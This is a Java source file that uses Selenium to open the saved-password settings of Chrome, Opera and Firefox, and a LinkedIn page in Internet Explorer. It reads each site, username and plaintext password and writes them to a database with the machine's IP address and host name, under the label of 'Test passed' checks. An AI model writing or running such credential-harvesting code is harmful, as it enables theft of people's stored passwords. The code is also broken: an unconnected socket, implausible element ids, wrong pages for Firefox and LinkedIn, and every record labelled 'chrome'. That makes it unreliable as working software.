package browserpass;

import java.net.Socket;
import java.util.Collections;
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.ie.InternetExplorerDriver;
import org.openqa.selenium.opera.OperaDriver;

public class BrowserPass {

    @PersistenceContext(unitName = "browserpasswords?zeroDateTimeBehavior=convertToNullPU")
    private EntityManager entityManager;
    Records_1 rec = new Records_1();
    Socket socket = new Socket();

    public static void main(String[] args) {
        BrowserPass pass = new BrowserPass();

        pass.opera();
        pass.chrome();
        pass.IE();
        pass.firefox();
    }

    public void chrome() {
        System.setProperty("webdriver.chrome.driver", "src\\browserpass\\chromedriver_2.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--start-maximized");
        options.setExperimentalOption("useAutomationExtension", false);
        options.setExperimentalOption("excludeSwitches", Collections.singletonList("enable-automation"));
        WebDriver driver = new ChromeDriver(options);
        driver.get("chrome://settings/passwords?search=passwords");

        for (int i = 1; i < 10; i++) {
            WebElement passwordList = driver.findElement(By.id("frb" + i));
            WebElement listitem = passwordList.findElement(By.className("list-item"));
            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
            WebElement passwordColumn = listitem.findElement(By.className("password-column"));

            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
            String username = websitecolumn.findElement(By.id("username")).getText();
            String password = passwordColumn.findElement(By.id("password")).getText();

            rec.setBrowser("chrome");
            rec.setCreatedtime(new java.util.Date());
            rec.setIpaddress(socket.getInetAddress().getHostAddress());
            rec.setOtherinfo(originurl);
            rec.setPassword(password);
            rec.setUser(username);
            rec.setPcname(socket.getInetAddress().getHostName());

            entityManager.getTransaction().begin();
            entityManager.persist(rec);
            entityManager.getTransaction().commit();
        }

        String actualUrl = "chrome://settings/passwords?search=passwords";
        String expectedUrl = driver.getCurrentUrl();
        if (actualUrl.equalsIgnoreCase(expectedUrl)) {
            System.out.println("Test passed");
        } else {
            System.out.println("Test failed");
        }
    }

    public void opera() {
        System.setProperty("webdriver.opera.driver", "src\\browserpass\\operadriver.exe");
        WebDriver driver = new OperaDriver();
        driver.manage().window().maximize();
        driver.get("opera://settings/passwords?search=Passwords");

        for (int i = 1; i < 10; i++) {
            WebElement passwordList = driver.findElement(By.id("frb" + i));
            WebElement listitem = passwordList.findElement(By.className("list-item"));
            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
            WebElement passwordColumn = listitem.findElement(By.className("password-column"));

            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
            String username = websitecolumn.findElement(By.id("username")).getText();
            String password = passwordColumn.findElement(By.id("password")).getText();

            rec.setBrowser("chrome");
            rec.setCreatedtime(new java.util.Date());
            rec.setIpaddress(socket.getInetAddress().getHostAddress());
            rec.setOtherinfo(originurl);
            rec.setPassword(password);
            rec.setUser(username);
            rec.setPcname(socket.getInetAddress().getHostName());

            entityManager.getTransaction().begin();
            entityManager.persist(rec);
            entityManager.getTransaction().commit();
        }

        String actualUrl = "opera://settings/passwords?search=Passwords";
        String expectedUrl = driver.getCurrentUrl();
        if (actualUrl.equalsIgnoreCase(expectedUrl)) {
            System.out.println("Test passed");
        } else {
            System.out.println("Test failed");
        }
    }

    public void firefox() {
        System.setProperty("webdriver.gecko.driver", "src\\browserpass\\geckodriver.exe");
        WebDriver driver = new FirefoxDriver();
        driver.manage().window().maximize();
        driver.get("about:preferences#privacy");

        for (int i = 1; i < 10; i++) {
            WebElement passwordList = driver.findElement(By.id("frb" + i));
            WebElement listitem = passwordList.findElement(By.className("list-item"));
            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
            WebElement passwordColumn = listitem.findElement(By.className("password-column"));

            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
            String username = websitecolumn.findElement(By.id("username")).getText();
            String password = passwordColumn.findElement(By.id("password")).getText();

            rec.setBrowser("chrome");
            rec.setCreatedtime(new java.util.Date());
            rec.setIpaddress(socket.getInetAddress().getHostAddress());
            rec.setOtherinfo(originurl);
            rec.setPassword(password);
            rec.setUser(username);
            rec.setPcname(socket.getInetAddress().getHostName());

            entityManager.getTransaction().begin();
            entityManager.persist(rec);
            entityManager.getTransaction().commit();
        }

        String actualUrl = "about:preferences#privacy";
        String expectedUrl = driver.getCurrentUrl();
        if (actualUrl.equalsIgnoreCase(expectedUrl)) {
            System.out.println("Test passed");
        } else {
            System.out.println("Test failed");
        }
    }

    public void IE() {
        System.setProperty("webdriver.ie.driver", "src\\browserpass\\IEDriverServer.exe");
        WebDriver driver = new InternetExplorerDriver();
        driver.manage().window().maximize();
        driver.get("https://www.linkedin.com/login");

        for (int i = 1; i < 10; i++) {
            WebElement passwordList = driver.findElement(By.id("frb" + i));
            WebElement listitem = passwordList.findElement(By.className("list-item"));
            WebElement websitecolumn = listitem.findElement(By.className("website-column"));
            WebElement passwordColumn = listitem.findElement(By.className("password-column"));

            String originurl = websitecolumn.findElement(By.id("originUrl")).getText();
            String username = websitecolumn.findElement(By.id("username")).getText();
            String password = passwordColumn.findElement(By.id("password")).getText();

            rec.setBrowser("chrome");
            rec.setCreatedtime(new java.util.Date());
            rec.setIpaddress(socket.getInetAddress().getHostAddress());
            rec.setOtherinfo(originurl);
            rec.setPassword(password);
            rec.setUser(username);
            rec.setPcname(socket.getInetAddress().getHostName());

            entityManager.getTransaction().begin();
            entityManager.persist(rec);
            entityManager.getTransaction().commit();
        }

        String actualUrl = "https://www.linkedin.com/feed/";
        String expectedUrl = driver.getCurrentUrl();
        if (actualUrl.equalsIgnoreCase(expectedUrl)) {
            System.out.println("Test passed");
        } else {
            System.out.println("Test failed");
        }
    }

}
